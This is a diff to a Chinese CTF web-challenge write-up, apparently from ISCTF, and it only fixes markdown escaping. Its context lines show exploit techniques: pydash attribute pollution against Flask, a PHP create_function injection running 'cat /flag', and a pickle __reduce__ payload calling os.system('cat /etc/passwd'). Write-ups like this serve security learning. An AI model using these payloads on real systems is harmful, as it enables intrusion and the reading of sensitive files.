@@ -293,7 +293,7 @@ def operate():
             return "oprate failed"
 ```
 
-这里pydash.set_存在属性污染，app存在于 globals() 中，我们可以控制username\=app，从而利用pydash.set\_ 修改Flask 应用的内部render_template的配置，让其本来指向templates文件夹变成指向根目录
+这里pydash.set_存在属性污染，app存在于 globals() 中，我们可以控制username=app，从而利用pydash.set_ 修改Flask 应用的内部render_template的配置，让其本来指向templates文件夹变成指向根目录
 
 ```python
 pydash.set_(obj, path, value)
@@ -389,7 +389,7 @@ echo urlencode($payload);
 //就等于function __lambda_func($args){ }"system"("cat /flag");// }
 ```
 
-## mv\_upload
+## mv_upload
 
 首先扫目录扫到index.php~,看源码
 
@@ -1105,7 +1105,7 @@ class RCE:
         return (os.system, ("cat /etc/passwd",))
 ```
 
-在Python中，\_\_reduce\_\_是一个特殊方法，它用于对象的序列化。当你使用pickle模块来序列化一个对象时，pickle模块会调用对象的\_\_reduce\_\_方法，如果该方法存在的话。那我们反序列化时就能搁着控制命令。
+在Python中，__reduce__是一个特殊方法，它用于对象的序列化。当你使用pickle模块来序列化一个对象时，pickle模块会调用对象的__reduce__方法，如果该方法存在的话。那我们反序列化时就能搁着控制命令。
 
 ```py
     def run(self):
@@ -1531,7 +1531,7 @@ if __name__ == "__main__":
 
 ![1b19881a-08a2-415e-8fdf-13b2429264fc](/img/ISCTF-web部分/1b19881a-08a2-415e-8fdf-13b2429264fc-20251219165432-dd4uovk.png)
 
-点击页面上的  **"喵喵喵" 按钮**（或者访问 run.php?action\=run，这里是PHP 调用 Python 脚本，Python 脚本加载恶意文件并执行命令。
+点击页面上的  **"喵喵喵" 按钮**（或者访问 run.php?action=run，这里是PHP 调用 Python 脚本，Python 脚本加载恶意文件并执行命令。
 
 ![88e681c7-e4b6-4faa-8b02-92ca2d89db12](/img/ISCTF-web部分/88e681c7-e4b6-4faa-8b02-92ca2d89db12-20251219165521-jl8dzq1.png)
 
